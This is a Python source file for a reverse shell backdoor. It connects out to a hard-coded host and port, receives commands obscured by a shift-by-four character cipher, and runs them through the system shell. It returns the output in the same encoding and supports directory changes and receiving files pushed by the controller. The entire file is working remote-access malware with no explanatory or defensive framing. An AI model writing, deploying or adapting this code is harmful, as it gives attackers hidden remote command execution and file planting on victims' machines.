import socket
import os
import subprocess
import multiprocessing
import select
import time
import ctypes

s=socket.socket()

def frecv(sck):

    fname=sck.recv(1024)

    fname=fname.decode()

    print(fname)

    fsize=sck.recv(1024)

    print(int(fsize.decode()))

    fhandle=open(fname,'wb')

    fhandle.write(sck.recv(int(fsize.decode())))

    print("Written")

    fhandle.close()

def dec(txt):

	i=0

	newbuf=''

	char=''

	dec=0

	for i in range(len(txt)):

		dec=ord(txt[i])

		char=chr(dec-4)

		newbuf+=char

	return newbuf

def enc(txt):

	i=0

	newbuf=''

	char=''

	dec=0

	for i in range(len(txt)):

		dec=ord(txt[i])

		char=chr(dec+4)

		newbuf+=char

	return newbuf

def reverseconn():

    host=socket.gethostbyname("localhost") #random address

    port=9999

    global s

    s.connect((host,port))

    while True:

        recvcmd=s.recv(2**24)

        if dec(recvcmd[:2].decode("utf-8"))=="cd":

            os.chdir(dec(recvcmd[3:].decode("utf-8")))

            s.send(str.encode(enc(str(os.getcwd())+'> ')))

        elif dec(recvcmd.decode("utf-8"))=="quit":

            break

        elif dec(recvcmd[:6].decode("utf-8"))=="ftrans":

            frecv(s)

        elif len(recvcmd)>0 and dec(recvcmd[:2].decode("utf-8"))!="cd":

            cmd = subprocess.Popen(dec(recvcmd[:].decode("utf-8")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            obyte=cmd.stdout.read()+cmd.stderr.read()

            ostr=str(obyte, "utf-8")

            s.send(str.encode(enc(ostr+str(os.getcwd())+'> ')))

    s.close()

def main():

    revhandle=multiprocessing.Process(target=reverseconn)

    revhandle.start()

    revhandle.join()

if __name__=='__main__':

    main()

    

    


        
